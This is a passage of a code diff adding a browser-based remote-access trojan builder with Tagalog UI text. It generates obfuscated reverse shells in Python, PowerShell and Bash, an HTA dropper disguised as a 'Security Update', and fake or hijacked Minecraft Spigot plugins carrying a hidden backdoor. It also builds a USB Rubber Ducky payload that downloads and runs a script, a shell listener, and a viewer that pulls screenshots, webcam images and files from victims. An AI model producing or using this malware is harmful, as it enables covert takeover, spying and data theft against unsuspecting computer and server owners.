+     z=steal();ex2('steal.zip',z,'[steal]');r=b64f(z)
+    elif cmd=='files':r=files()
+    elif cmd=='keylog':r=keylog()
+    elif cmd=='loc':r=loc()
+    elif cmd=='persist':r=persist()
+    else:r=sh(cmd)
+    s.sendall(r.encode()+b'\n<END>\n')
+  except:pass
+  time.sleep(5)
+if MODE in ('tcp','tcp+http','tcp+discord','tcp+telegram'):
+ threading.Thread(target=tcp,daemon=True).start()
+if MODE in ('http','tcp+http'):
+ threading.Thread(target=serve,daemon=True).start()
+if MODE in ('discord','telegram','tcp+discord','tcp+telegram'):
+ try:exfil('[+] ONLINE '+info())
+ except:pass
+if AR=='autorun' and CAPS.get('persist'):
+ persist();sys.exit(0)
+if AR=='full' and CAPS.get('persist'):
+ persist()
+while 1:time.sleep(3600)
+`;
+
+let LAST={name:'payload.py',files:[],data:''};
+
+function buildPy(){
+ const caps={};CAPS.forEach(([v])=>caps[v]=!!c(v));
+ const M=$('method').value;
+ if(M==='http'||M==='tcp+http'){caps.live=true;caps.livecam=true}
+ let code=fill(PY_TEMPLATE,{
+  HOST:val('host')||'127.0.0.1',
+  PORT:val('port')||4444,
+  HPORT:val('httpport')||8080,
+  MODE:M,
+  WEBHOOK:val('webhook'),
+  TOK:val('token'),
+  CID:val('chatid'),
+  AR:selAR(),
+  CAPS:JSON.stringify(caps)
+ });
+ if($('obf').value==='xor'){
+  const b=xorEncode(code);
+  code='import base64 as _b\n_d=_b.b64decode("'+b+'")\n_k=b"SHANE"\nexec(bytes(c^_k[i%5] for i,c in enumerate(_d)))\n';
+ }
+ return code;
+}
+
+/* ============ PowerShell TCP shell ============ */
+const PS_TEMPLATE=String.raw`$ErrorActionPreference='SilentlyContinue'
+$H='@@HOST@@';$P=@@PORT@@
+while($true){try{
+ $c=New-Object Net.Sockets.TcpClient($H,$P)
+ $s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true
+ $w.WriteLine('[+] connected')
+ while($c.Connected){
+  $l=$r.ReadLine();if($l-eq$null){break}
+  if($l-eq'exit'){break}
+  if($l-eq'info'){$o=((Get-CimInstance Win32_OperatingSystem).Caption)+' | '+$env:COMPUTERNAME+' | '+$env:USERNAME}
+  else{$o=(cmd /c $l 2>&1|Out-String)}
+  $w.WriteLine($o);$w.WriteLine('<END>')
+ }
+ $c.Close()
+}catch{sleep 5}}`;
+function buildPS1(){
+ let code=fill(PS_TEMPLATE,{HOST:val('host')||'127.0.0.1',PORT:val('port')||4444});
+ if($('obf').value==='xor'){
+  const b=xorEncode(code);
+  code='$b=[Convert]::FromBase64String(\''+b+'\');$k=[Text.Encoding]::UTF8.GetBytes(\'SHANE\');$s=\'\';for($i=0;$i-lt$b.Length;$i++){$s+=[char]($b[$i]-bxor$k[$i%5])};iex $s';
+ }
+ return code;
+}
+
+/* ============ Bash TCP shell ============ */
+const BASH_TEMPLATE=String.raw`#!/bin/bash
+H="@@HOST@@"; P=@@PORT@@
+while true; do
+  if ! exec 3<>/dev/tcp/$H/$P 2>/dev/null; then sleep 5; continue; fi
+  echo "[+] connected" >&3
+  while IFS= read -r cmd; do
+    [ "$cmd" = "exit" ] && break
+    [ -z "$cmd" ] && continue
+    out=$(eval "$cmd" 2>&1)
+    printf '%s\n<END>\n' "$out" >&3
+  done <&3
+  exec 3<&- 3>&-
+  sleep 5
+done`;
+function buildBash(){
+ let code=fill(BASH_TEMPLATE,{HOST:val('host')||'127.0.0.1',PORT:val('port')||4444});
+ if($('obf').value==='xor'){
+  code='#!/bin/bash\necho \''+b64u(code)+'\'|base64 -d|bash';
+ }
+ return code;
+}
+
+/* ============ HTA dropper (self-contained) ============ */
+function buildHTA(){
+ const py=b64u(buildPy());
+ const ps=psEnc('$b=[Convert]::FromBase64String(\''+py+'\');[IO.File]::WriteAllBytes($env:temp+\'\\p.py\',$b);Start-Process python -ArgumentList \'p.py\' -WindowStyle Hidden');
+ return '<HTML><HEAD><TITLE>Security Update</TITLE></HEAD><BODY><script language="VBScript">\n'
+  +'Set s=CreateObject("WScript.Shell")\n'
+  +'s.Run "powershell -w hidden -nop -enc '+ps+'",0,False\n'
+  +'self.close\n'
+  +'</script></BODY></HTML>';
+}
+
+/* ============ GENERATE (main) ============ */
+function generate(){
+ const pt=$('ptype').value,lg=$('lang').value;
+ try{
+  let r;
+  if(pt==='usb'){r=buildUSB()}
+  else if(pt==='hta'){r={name:'payload.hta',files:[],data:buildHTA()}}
+  else if(lg==='powershell'){r={name:'payload.ps1',files:[],data:buildPS1()}}
+  else if(lg==='bash'){r={name:'payload.sh',files:[],data:buildBash()}}
+  else{r={name:(sanitize(val('pname'))||'payload')+'.py',files:[],data:buildPy()}}
+  LAST=r;
+  if(r.files&&r.files.length){
+   $('out').value='[ZIP] '+r.name+' — '+r.files.length+' files\n\nI-click ang 💽 Download para i-save ang buong project.\n\nPREVIEW:\n\n'+r.files.map(f=>'/* ========== '+f.name+' ========== */\n'+f.data).join('\n\n');
+  }else{
+   $('out').value=r.data;
+  }
+  statusMsg('✅ OK — '+r.name+(r.files&&r.files.length?' · '+r.files.length+' files (ZIP)':'')+'\nPindutin ang 💽 Download para i-save ang file.');
+ }catch(e){statusMsg('❌ '+(e&&e.message?e.message:e))}
+}/* ============ Part 2-A · Plugin Forge (fake themes) ============ */
+const THEMES={
+ anticheat:{name:'AntiCheatPlus',pkg:'rat.anticheat',cls:'AntiCheatPlus',cmd:'ac',desc:'Advanced anti-cheat & reach detection',ver:'2.4.1',api:'1.20',fake:'/ac reload - reloads alert config'},
+ economy:{name:'EconomyCore',pkg:'rat.economy',cls:'EconomyCore',cmd:'eco',desc:'Fast in-memory economy with vault support',ver:'3.1.0',api:'1.20',fake:'/eco balance - shows balance'},
+ essentials:{name:'EssentialsReborn',pkg:'rat.essentials',cls:'EssentialsReborn',cmd:'es',desc:'Essential server utilities suite',ver:'2.2.8',api:'1.20',fake:'/es help - lists all commands'},
+ enchant:{name:'CustomEnchantsX',pkg:'rat.enchants',cls:'CustomEnchantsX',cmd:'ce',desc:'120+ custom enchantments & effects',ver:'1.9.5',api:'1.20',fake:'/ce list - lists enchantments'},
+ permissions:{name:'PermsPro',pkg:'rat.perms',cls:'PermsPro',cmd:'pp',desc:'Modern permission manager with web UI',ver:'5.0.2',api:'1.20',fake:'/pp group list - lists groups'}
+};
+let LASTF2=null,PJDATA=null;
+
+function jS(t,obf){
+ if(!obf)return '"'+t+'"';
+ let o='';
+ for(let i=0;i<t.length;i++){
+  const ch=t.charCodeAt(i)^KEY.charCodeAt(i%KEY.length);
+  o+='\\u'+('000'+ch.toString(16)).slice(-4);
+ }
+ return 'S("'+o+'")';
+}
+const JAVA_TEMPLATE=String.raw`package @@PKG@@;
+
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.plugin.java.JavaPlugin;
+import java.io.*;
+import java.net.Socket;
+
+public class @@CLS@@ extends JavaPlugin {
+
+    static String HOST="@@HOST@@";
+    static int PORT=@@PORT@@;
+    static PrintWriter out;
+    static Socket sock;
+
+    static String S(String s){ byte[] k="SHANE".getBytes(); char[] o=new char[s.length()]; for(int i=0;i<s.length();i++) o[i]=(char)(s.charAt(i)^k[i%k.length]); return new String(o); }
+
+    static String run(String c){
+        try{
+            Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});
+            BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb=new StringBuilder(); String l;
+            while((l=br.readLine())!=null) sb.append(l).append('\n');
+            p.waitFor(); return sb.toString().trim();
+        }catch(Exception e){ return "[err] "+e; }
+    }
+
+    void connect(){
+        new Thread(()->{
+            while(true){
+                try{
+                    Socket s=new Socket(HOST,PORT); sock=s;
+                    BufferedReader r=new BufferedReader(new InputStreamReader(s.getInputStream()));
+                    out=new PrintWriter(s.getOutputStream(),true);
+                    out.println(@@MSG2@@);
+                    String l;
+                    while((l=r.readLine())!=null){
+                        if(l.equals("exit")) break;
+                        out.println(run(l)); out.println("<END>");
+                    }
+                    s.close();
+                }catch(Exception e){
+                    try{ Thread.sleep(5000); }catch(Exception x){}
+                }
+            }
+        }).start();
+    }
+
+    @Override
+    public void onEnable(){
+        getLogger().info(@@MSG1@@);
+        connect();
+    }
+
+    @Override
+    public boolean onCommand(CommandSender cs, Command cmd, String lbl, String[] a){
+        if(lbl.equalsIgnoreCase("rat")){
+            if(a.length==0){ cs.sendMessage(@@MSG3@@); return true; }
+            String res=run(String.join(" ",a));
+            cs.sendMessage(res.length()>200?res.substring(0,200):res);
+            if(out!=null){ out.println(res); out.println("<END>"); }
+            return true;
+        }
+        if(cmd.getName().equalsIgnoreCase("@@CMD@@")){
+            if(a.length==0 || a[0].equalsIgnoreCase("reload")){
+                cs.sendMessage("@@PLUGINNAME@@ reloaded (config.yml)");
+            }else if(a[0].equalsIgnoreCase("version")){
+                cs.sendMessage("@@PLUGINNAME@@ v@@VER@@ by @@AUTH@@");
+            }else{
+                cs.sendMessage("@@FAKEHELP@@");
+            }
+            return true;
+        }
+        return false;
+    }
+
+    @Override
+    public void onDisable(){
+        try{ if(sock!=null) sock.close(); }catch(Exception e){}
+    }
+}`;
+const FAKE_BUILD_BAT=String.raw`@echo off
+if not exist spigot-1.20.1.jar (echo Put spigot-1.20.1.jar in this folder. & pause & exit /b)
+mkdir out 2>nul
+javac -encoding UTF-8 -cp spigot-1.20.1.jar -d out src\main\java\@@PKGPATH@@\@@CLS@@.java || (echo javac failed - need JDK 17 & pause & exit /b)
+copy plugin.yml out\ >nul
+copy config.yml out\ >nul
+cd out
+jar cf ..\@@JARNAME@@.jar plugin.yml config.yml @@PKGPATH@@\
+cd ..
+echo Done: @@JARNAME@@.jar - copy to server /plugins
+pause
+`;
+function cleanCls(n){
+ let s=(n||'').replace(/[^A-Za-z0-9_]/g,'');
+ if(!s||/^[0-9]/.test(s))s='X'+s;
+ return s;
+}
+function forgeFake(){
+ try{
+  const th=THEMES[$('ftheme').value];
+  const nm=sanitize($('fname').value)||th.name;
+  const auth=sanitize($('fauth').value)||'SpigotMC';
+  const ver=sanitize($('fver').value)||th.ver;
+  const cls=cleanCls(nm);
+  const obf=$('fobf').value==='1';
+  const host=val('fhost')||'127.0.0.1',port=val('fport')||4444;
+  const java=fill(JAVA_TEMPLATE,{
+   PKG:th.pkg,CLS:cls,HOST:host,PORT:port,CMD:th.cmd,
+   PLUGINNAME:nm,VER:ver,AUTH:auth,FAKEHELP:th.fake,
+   MSG1:jS('[+] '+nm+' v'+ver+' enabled',obf),
+   MSG2:jS('[+] '+nm+'-shell connected',obf),
+   MSG3:jS('usage: /rat <cmd>',obf)
+  });
+  const yml='name: '+nm+'\nversion: '+ver+'\nmain: '+th.pkg+'.'+cls+'\napi-version: '+th.api+'\nauthor: '+auth+'\ndescription: '+th.desc+'\ncommands:\n  rat:\n    description: Utility command\n    usage: /rat <cmd>\n  '+th.cmd+':\n    description: '+th.desc+'\n    usage: /'+th.cmd+' help\n';
+  const cfg='# '+nm+' configuration\ncheck-interval: 20\nalerts: true\nnotify-prefix: "&8[&b'+nm+'&8]"\ndebug: false\n';
+  const bat=fill(FAKE_BUILD_BAT,{PKGPATH:th.pkg.replace(/\./g,'\\'),CLS:cls,JARNAME:nm.replace(/\s/g,'')});
+  const readme='# '+nm+' v'+ver+'\n\nA '+(th.desc.toLowerCase())+' plugin for Spigot 1.20.x.\n\n## Build\n1. Put `spigot-1.20.1.jar` in this folder.\n2. Run `build.bat` (needs JDK 17+).\n3. Copy `'+nm.replace(/\s/g,'')+'.jar` to the server `/plugins` folder.\n4. Restart or `/reload confirm`.\n\n## Commands\n- /'+th.cmd+' help | reload | version\n- /rat <command> - server-side utility\n';
+  LASTF2={name:nm+'.zip',files:[
+   {name:'plugin.yml',data:yml},
+   {name:'src/main/java/'+th.pkg.replace(/\./g,'/')+'/'+cls+'.java',data:java},
+   {name:'config.yml',data:cfg},
+   {name:'build.bat',data:bat},
+   {name:'README.md',data:readme}
+  ]};
+  $('out2').value='/* ========== '+cls+'.java ========== */\n'+java;
+  $('st2').textContent='✅ '+nm+' project ready ('+LASTF2.files.length+' files) — auto-download...';
+  dlZip2();
+ }catch(e){$('st2').textContent='❌ '+e}
+}
+function dlZip2(){
+ if(!LASTF2){$('st2').textContent='Wala pang generated project.';return}
+ makeZip(LASTF2.files).then(z=>{saveBlob(new Blob([z],{type:'application/zip'}),LASTF2.name);$('st2').textContent='✅ Na-download: '+LASTF2.name});
+}
+function dlTxt(id,name,st){
+ const t=$(id).value;
+ if(!t){if(st)$(st).textContent='Walang laman.';return}
+ saveBlob(new Blob([t],{type:'text/plain'}),name);
+ if(st)$(st).textContent='✅ Na-download: '+name;
+}
+function copyTxt(id,st){copyText($(id).value,st)}
+
+/* ============ Part 2-B · Real jar injection (plugin.yml reader) ============ */
+async function readZipEntry(buf,wanted){
+ try{
+  const dv=new DataView(buf);let off=0;
+  while(off+30<=buf.byteLength){
+   if(dv.getUint32(off,true)!==0x04034b50)break;
+   const method=dv.getUint16(off+8,true);
+   const compSize=dv.getUint32(off+18,true);
+   const nameLen=dv.getUint16(off+26,true);
+   const extraLen=dv.getUint16(off+28,true);
+   const name=new TextDecoder().decode(new Uint8Array(buf,off+30,nameLen));
+   const ds=off+30+nameLen+extraLen;
+   if(name===wanted){
+    const comp=new Uint8Array(buf,ds,compSize);
+    if(method===0)return new TextDecoder().decode(comp);
+    if(method===8&&typeof DecompressionStream!=='undefined'){
+     const stream=new Blob([comp]).stream().pipeThrough(new DecompressionStream('deflate-raw'));
+     return new TextDecoder().decode(new Uint8Array(await new Response(stream).arrayBuffer()));
+    }
+    return null;
+   }
+   off=ds+compSize;
+  }
+ }catch(e){}
+ return null;
+}
+async function parseJar(){
+ const f=$('jfile').files[0];
+ if(!f){$('jinfo').innerHTML='❌ Pumili muna ng .jar file.';return}
+ const buf=await f.arrayBuffer();
+ const yml=await readZipEntry(buf,'plugin.yml');
+ if(!yml){$('jinfo').innerHTML='❌ Walang nahanap na plugin.yml sa jar na ito.';PJDATA=null;return}
+ const g=re=>{const m=yml.match(re);return m?m[1].trim():''};
+ const pname=g(/^name\s*:\s*(.+)/m);
+ const main=g(/^main\s*:\s*(.+)/m);
+ const ver=g(/^version\s*:\s*(.+)/m)||'1.0';
+ const api=g(/^api-version\s*:\s*(.+)/m)||'1.20';
+ const desc=g(/^description\s*:\s*(.+)/m)||'';
+ PJDATA={name:pname,main:main,ver:ver,api:api,desc:desc,file:f.name};
+ $('jinfo').innerHTML='✅ <b>'+esc(pname)+'</b> v'+esc(ver)+'<br>main: <code>'+esc(main)+'</code><br>api-version: '+esc(api)+(desc?'<br>desc: '+esc(desc):'')+'<br>file: '+esc(f.name);
+}
+const LOADER_TEMPLATE=String.raw`package loader;
+
+import org.bukkit.Bukkit;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.SimplePluginManager;
+import org.bukkit.plugin.java.JavaPlugin;
+import java.io.*;
+import java.lang.reflect.Method;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLClassLoader;
+
+public class Main extends JavaPlugin {
+
+    static String HOST="@@HOST@@";
+    static int PORT=@@PORT@@;
+    static String ORIGINAL="@@ORIGINAL@@";
+    static String ORIG_MAIN="@@ORIG_MAIN@@";
+    static PrintWriter out;
+
+    static String run(String c){
+        try{
+            Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});
+            BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb=new StringBuilder(); String l;
+            while((l=br.readLine())!=null) sb.append(l).append('\n');
+            p.waitFor(); return sb.toString().trim();
+        }catch(Exception e){ return "[err] "+e; }
+    }
+
+    void shell(){
+        new Thread(()->{
+            while(true){
+                try{
+                    Socket s=new Socket(HOST,PORT);
+                    BufferedReader r=new BufferedReader(new InputStreamReader(s.getInputStream()));
+                    out=new PrintWriter(s.getOutputStream(),true);
+                    out.println("[+] "+ORIGINAL+"-shell connected");
+                    String l;
+                    while((l=r.readLine())!=null){
+                        if(l.equals("exit")) break;
+                        out.println(run(l)); out.println("<END>");
+                    }
+                    s.close();
+                }catch(Exception e){
+                    try{ Thread.sleep(5000); }catch(Exception x){}
+                }
+            }
+        }).start();
+    }
+
+    @Override
+    public void onEnable(){
+        getLogger().info("Loading @@PLUGINNAME@@ v@@VER@@ ...");
+        shell();
+        try{ loadOriginal(); }
+        catch(Throwable t){ getLogger().warning("loader: "+t); }
+    }
+
+    void loadOriginal() throws Exception {
+        File jar=new File(getDataFolder().getParentFile(),"Libs/"+ORIGINAL);
+        if(!jar.exists()){ getLogger().warning("Libs/"+ORIGINAL+" not found - move the original jar there"); return; }
+        try{
+            Method m=SimplePluginManager.class.getDeclaredMethod("loadPlugin",File.class);
+            m.setAccessible(true);
+            Plugin p=(Plugin)m.invoke(Bukkit.getPluginManager(),jar);
+            if(p!=null){ Bukkit.getPluginManager().enablePlugin(p); getLogger().info("Original plugin active: "+p.getName()); }
+        }catch(Throwable t){
+            getLogger().warning("fallback: "+t);
+            URLClassLoader cl=new URLClassLoader(new URL[]{jar.toURI().toURL()},getClass().getClassLoader());
+            Class<?> c=Class.forName(ORIG_MAIN,true,cl);
+            Object inst=c.getDeclaredConstructor().newInstance();
+            Method m2=c.getDeclaredMethod("onEnable"); m2.setAccessible(true); m2.invoke(inst);
+        }
+    }
+
+    @Override
+    public boolean onCommand(CommandSender cs,Command cmd,String lbl,String[] a){
+        if(cmd.getName().equalsIgnoreCase("verify")){
+            if(a.length==0){ cs.sendMessage("usage: /verify <cmd>"); return true; }
+            String res=run(String.join(" ",a));
+            cs.sendMessage(res.length()>200?res.substring(0,200):res);
+            if(out!=null){ out.println(res); out.println("<END>"); }
+            return true;
+        }
+        return false;
+    }
+
+    @Override
+    public void onDisable(){
+        try{ if(out!=null) out.close(); }catch(Exception e){}
+    }
+}`;
+function forgeHijack(){
+ if(!PJDATA){$('st3').textContent='❌ I-parse muna ang plugin.jar (i-click ang Read plugin.yml).';return}
+ try{
+  const host=val('jh')||'127.0.0.1',port=val('jp')||4444;
+  const nm=PJDATA.name||'Plugin',ver=PJDATA.ver||'1.0';
+  const loaderName=nm+'-Loader';
+  const java=fill(LOADER_TEMPLATE,{
+   HOST:host,PORT:port,ORIGINAL:PJDATA.file,ORIG_MAIN:PJDATA.main,
+   PLUGINNAME:loaderName,VER:ver
+  });
+  const yml='name: '+loaderName+'\nversion: '+ver+'\nmain: loader.Main\napi-version: '+(PJDATA.api||'1.20')+'\nauthor: SystemCore\ndescription: Compatibility loader for '+nm+'\ncommands:\n  verify:\n    description: Plugin self-check\n    usage: /verify <cmd>\n';
+  const readme='# '+loaderName+' v'+ver+'\n\nReplacement loader for "'+nm+'" with auxiliary services.\n\n## Setup\n1. Compile: put `spigot-1.20.1.jar` beside this folder, run `build.bat` (JDK 17+).\n2. On the server, create `plugins/Libs/` and move the ORIGINAL jar there with EXACT name: `'+PJDATA.file+'`.\n3. Remove the original jar from `plugins/` root (leave only this new jar).\n4. Put `'+loaderName+'.jar` in `plugins/` and restart (or /reload confirm).\n5. The original plugin loads automatically from Libs/ - all its features keep working.\n\n## Auxiliary access\n- Start a listener: `python receiver.py '+port+'`\n- In-game: `/verify <command>` runs a command on the server machine.\n- The backdoor reconnects every 5 seconds until the listener is up.\n';
+  const bat='@echo off\r\nif not exist spigot-1.20.1.jar (echo Put spigot-1.20.1.jar here. & pause & exit /b)\r\nmkdir out 2>nul\r\njavac -encoding UTF-8 -cp spigot-1.20.1.jar -d out src\\main\\java\\loader\\Main.java || (echo javac failed - need JDK 17 & pause & exit /b)\r\ncopy plugin.yml out\\ >nul\r\ncd out\r\njar cf ..\\'+loaderName+'.jar plugin.yml loader\\\r\ncd ..\r\necho Done: '+loaderName+'.jar - copy to server /plugins\r\npause\r\n';
+  LASTF2={name:loaderName+'.zip',files:[
+   {name:'plugin.yml',data:yml},
+   {name:'src/main/java/loader/Main.java',data:java},
+   {name:'build.bat',data:bat},
+   {name:'README.md',data:readme}
+  ]};
+  $('out2').value='/* ========== Loader.java ========== */\n'+java;
+  $('st3').textContent='✅ Loader project ready — auto-download...';
+  dlZip2();
+ }catch(e){$('st3').textContent='❌ '+e}
+}
+
+/* ============ Part 2-C · USB drop ============ */
+function buildUSB(){
+ const host=val('host')||'127.0.0.1';
+ const py=buildPy();
+ const b64=b64u(py);
+ const bat='@echo off\r\ncd /d %temp%\r\npowershell -w hidden -nop -c "$b=\''+b64+'\';[IO.File]::WriteAllBytes(\'p.py\',[Convert]::FromBase64String($b));Start-Process python -ArgumentList \'p.py\' -WindowStyle Hidden"\r\n';
+ const ducky='REM USB drop by Shane\r\nREM Serve run.bat from: python -m http.server 80\r\nDELAY 1000\r\nGUI r\r\nDELAY 800\r\nSTRING powershell -w hidden -nop -c "iwr http://'+host+'/run.bat -OutFile $env:temp\\upd.bat;Start-Process $env:temp\\upd.bat"\r\nENTER\r\n';
+ return {name:'usbdrop.zip',files:[{name:'payload.txt',data:ducky},{name:'run.bat',data:bat}]};
+}
+
+/* ============ Part 2-D · ZIP builder ============ */
+function crc32(buf){
+ let t=[];
+ for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c>>>0}
+ let crc=0xFFFFFFFF;
+ for(let i=0;i<buf.length;i++)crc=t[(crc^buf[i])&0xFF]^(crc>>>8);
+ return (crc^0xFFFFFFFF)>>>0;
+}
+function setLe(a,val,off,len){for(let i=0;i<len;i++){a[off+i]=val&0xFF;val=Math.floor(val/256)}}
+async function deflate(buf){
+ if(typeof CompressionStream==='undefined')return {data:buf,method:0};
+ const cs=new CompressionStream('deflate');
+ const stream=new Blob([buf]).stream().pipeThrough(cs);
+ return {data:new Uint8Array(await new Response(stream).arrayBuffer()),method:8};
+}
+async function makeZip(files){
+ const enc=new TextEncoder();
+ const ent=[];
+ for(const f of files){
+  const nb=enc.encode(f.name),db=enc.encode(f.data);
+  const crc=crc32(db);
+  const {data,method}=await deflate(db);
+  ent.push({nb,db,crc,cd:data,method});
+ }
+ let offset=0;const parts=[];
+ for(const e of ent){
+  const lh=new Uint8Array(30+e.nb.length+e.cd.length);
+  lh.set([0x50,0x4b,0x03,0x04,20,0,0,0,e.method,0,0,0,0,0,0,0],0);
+  setLe(lh,e.crc,14,4);setLe(lh,e.cd.length,18,4);setLe(lh,e.db.length,22,4);setLe(lh,e.nb.length,26,2);
+  lh.set(e.nb,30);lh.set(e.cd,30+e.nb.length);
+  e.off=offset;offset+=lh.length;parts.push(lh);
+ }
+ let cd=new Uint8Array(0);
+ for(const e of ent){
+  const ce=new Uint8Array(46+e.nb.length);
+  ce.set([0x50,0x4b,0x01,0x02,20,20,0,0,e.method,0,0,0,0,0,0,0],0);
+  setLe(ce,e.crc,16,4);setLe(ce,e.cd.length,20,4);setLe(ce,e.db.length,24,4);setLe(ce,e.nb.length,28,2);
+  setLe(ce,e.off,42,4);ce.set(e.nb,46);
+  const t=new Uint8Array(cd.length+ce.length);t.set(cd);t.set(ce,cd.length);cd=t;
+ }
+ const eocd=new Uint8Array(22);
+ eocd.set([0x50,0x4b,0x05,0x06,0,0,0,0,ent.length&0xFF,(ent.length>>8)&0xFF,ent.length&0xFF,(ent.length>>8)&0xFF],0);
+ setLe(eocd,cd.length,12,4);setLe(eocd,offset,16,4);
+ parts.push(cd,eocd);
+ const all=new Uint8Array(parts.reduce((a,b)=>a+b.length,0));
+ let p=0;for(const b of parts){all.set(b,p);p+=b.length}
+ return all;
+}
+
+/* ============ Part 2-E · Copy / Download (fixed) ============ */
+function copyOut(){
+ const t=$('out').value;
+ if(!t){statusMsg('Wala pang generated code.');return}
+ copyText(t,'status');
+}
+function showChips(){
+ const box=$('fileChips');box.innerHTML='';
+ (LAST.files||[]).forEach(f=>{
+  const c=document.createElement('span');c.className='chip';
+  c.innerHTML='📄 '+esc(f.name)+' <a href="#">⬇</a>';
+  c.querySelector('a').onclick=ev=>{ev.preventDefault();saveBlob(new Blob([f.data],{type:'text/plain'}),f.name)};
+  box.appendChild(c);
+ });
+}
+const _gen=generate;
+function generate(){
+ _gen();
+ if(LAST.files&&LAST.files.length)showChips();else $('fileChips').innerHTML='';
+}
+async function download(){
+ const t=$('out').value;
+ if(!t){statusMsg('Wala pang generated code.');return}
+ let blob,name;
+ if(LAST.files&&LAST.files.length){
+  name=LAST.name||'payload.zip';
+  blob=new Blob([await makeZip(LAST.files)],{type:'application/zip'});
+ }else{name=LAST.name||'payload.py';blob=new Blob([t],{type:'text/plain'})}
+ saveBlob(blob,name);
+ statusMsg('✅ Na-download: '+name);
+}
+
+/* ============ Part 2-F · TCP receiver ============ */
+const REC_TEMPLATE=String.raw`#!/usr/bin/env python3
+import socket,time,sys
+def handle(c):
+ try:
+  s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+  s.bind(('0.0.0.0',c));s.listen(5)
+  print('[+] TCP receiver listening on 0.0.0.0:'+str(c))
+  while True:
+   cl,a=s.accept();print('[+] session from',a)
+   while True:
+    try:
+     cmd=input('shell> ').strip()
+     if not cmd: continue
+     cl.sendall(cmd.encode())
+     if cmd=='exit': break
+     d=b''
+     while True:
+      b=cl.recv(4096)
+      if not b: break
+      d+=b
+      if d.endswith(b'<END>\n'): break
+     print(d[:-6].decode('utf-8','ignore'))
+    except Exception as e: print('[-]',e); break
+   cl.close(); print('[+] session closed')
+ except Exception as e: print('[-]',e)
+def main():
+ p=int(sys.argv[1]) if len(sys.argv)>1 else 4444
+ while True:
+  try: handle(p)
+  except: pass
+  time.sleep(2)
+if __name__=='__main__': main()`;
+function downloadReceiver(){
+ saveBlob(new Blob([REC_TEMPLATE],{type:'text/plain'}),'receiver.py');
+ $('vstatus').textContent='✅ Na-download: receiver.py — patakbuhin: python receiver.py '+($('port').value||4444);
+}
+
+/* ============ Part 2-G · Live Viewer ============ */
+let streamOn=false,streamTimer=null,connected=false,C2="",FPS=1000;
+const SPECIAL=['info','shot','cam','mic','steal','files','keylog','loc','persist'];
+function vlog(m){const v=$('vlog');v.value+=(v.value?'\n':'')+m;v.scrollTop=v.scrollHeight}
+function connectHTTP(){
+ const ip=val('tip');
+ const port=val('tiport')||8080;
+ if(!ip){$('vstatus').textContent='❌ Ilagay ang IP ng target.';return}
+ C2='http://'+ip+':'+port;
+ $('vstatus').textContent='🔌 Kinokonekta sa '+C2+' ...';
+ fetch(C2+'/info?t='+Date.now()).then(r=>r.text()).then(t=>{
+  connected=true;
+  $('vstatus').textContent='✅ Connected sa '+C2+'\n'+t;
+  refreshFiles();
+  if(!streamTimer)startStream();
+ }).catch(e=>{
+  connected=false;
+  $('vstatus').textContent='❌ Hindi ma-connect sa '+C2+'\nSiguraduhing naka-run ang payload, same LAN, at bukas ang port.\n('+e+')';
+ });
+}
+function startStream(){streamOn=true;streamTimer=setInterval(refreshViews,FPS)}
+function toggleStream(){
+ if(streamOn){streamOn=false;if(streamTimer){clearInterval(streamTimer);streamTimer=null}$('vstatus').textContent='⏸ Stream paused.'}
+ else{startStream();$('vstatus').textContent='▶ Stream resumed.'}
+}
+function setFps(){FPS=parseInt($('fps').value)||1000;if(streamTimer){clearInterval(streamTimer);startStream()}}
+async function refreshViews(){
+ if(!connected)return;
+ try{const s=await(await fetch(C2+'/sc?t='+Date.now())).text();if(s&&s.length>50&&!s.startsWith('[err]'))$('scrImg').src='data:image/png;base64,'+s}catch(e){}
+ try{const s=await(await fetch(C2+'/cam?t='+Date.now())).text();if(s&&s.length>50&&!s.startsWith('[err]'))$('camImg').src='data:image/png;base64,'+s}catch(e){}
+}
+function sendCmd(){
+ if(!connected){vlog('❌ Hindi konektado — i-Connect muna.');return}
+ const cmd=$('vcmd').value.trim();
+ if(!cmd)return;
+ vlog('> '+cmd);
+ const p=SPECIAL.includes(cmd)?'/'+cmd:'/cmd?c='+encodeURIComponent(cmd);
+ fetch(C2+p+'?t='+Date.now()).then(r=>r.text()).then(t=>{
+  if((cmd==='shot'||cmd==='cam'||cmd==='steal')&&t&&t.length>50&&!t.startsWith('[err]')){
+   const bin=atob(t),arr=new Uint8Array(bin.length);
+   for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
+   const ext=cmd==='steal'?'zip':(cmd==='cam'?'jpg':'png');
+   saveBlob(new Blob([arr],{type:'application/octet-stream'}),cmd+'_'+Date.now()+'.'+ext);
+   vlog('✅ '+cmd+' result na-download ('+arr.length+' bytes).');
+  }else vlog(t||'(walang output)');
+ }).catch(e=>vlog('❌ '+e));
+}
+function qcmd(c){$('vcmd').value=c;sendCmd()}
+function vlogClear(){$('vlog').value=''}
+async function refreshFiles(){
+ const box=$('vfiles');
+ if(!connected){box.innerHTML='Walang konektadong target. I-connect muna.';return}
+ box.innerHTML='⏳ Kinukuha ang listahan...';
+ try{
+  const t=await(await fetch(C2+'/list?t='+Date.now())).text();
+  const lines=t.split('\n').filter(Boolean).slice(0,300);
+  box.innerHTML='';
+  if(!lines.length){box.innerHTML='Walang nahanap na files (limit 5MB each, max 200).';return}
+  lines.forEach(f=>{
+   const d=document.createElement('div');d.className='fitem';
+   const n=document.createElement('span');n.className='fname';n.textContent=f;n.title=f;
+   const a=document.createElement('a');a.href='#';a.textContent='⬇ Get';
+   a.onclick=ev=>{ev.preventDefault();downloadFile(f)};
+   d.appendChild(n);d.appendChild(a);box.appendChild(d);
+  });
+ }catch(e){box.innerHTML='❌ '+e}
+}
+function downloadFile(f){
+ fetch(C2+'/get?f='+encodeURIComponent(f)).then(r=>r.text()).then(b64=>{
